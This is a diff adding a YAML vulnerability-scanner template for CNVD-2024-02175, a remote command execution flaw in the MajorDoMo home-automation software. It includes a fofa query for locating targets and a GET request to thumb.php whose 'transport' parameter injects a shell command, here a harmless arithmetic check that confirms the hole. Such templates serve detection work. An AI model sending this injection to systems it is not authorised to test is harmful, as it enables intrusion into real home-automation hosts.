@@ -1,0 +1,27 @@
+id: CNVD-2024-02175
+info:
+  name: MajorDoMo rce
+  author: laohuan12138
+  severity: critical
+  verified: true
+  description: |
+    fofa: app="MajordomoSL"
+    MajorDoMo 是一款用于家庭自动化和控制的开源软件,它允许您使用各种设备和协议控制您的家庭设备,该应用存在命令执行漏洞，可获取系统权限。
+  references:
+    - https://mp.weixin.qq.com/s/2K3QrdFrJRmP29JgpTEKQg
+
+  tags: rce,cnvd,cnvd2024
+  created: 2024/05/13
+
+set:
+  num1: randomInt(1000,9999)
+  num2: randomInt(1000,9999)
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+expr+{{num1}}+\*+{{num2}}%3B+echo+%27%5BE%5D%27%29%23%3B
+    expression: response.status == 200 && response.body.bcontains(bytes(string(num1 * num2)))
+
+expression: r0()
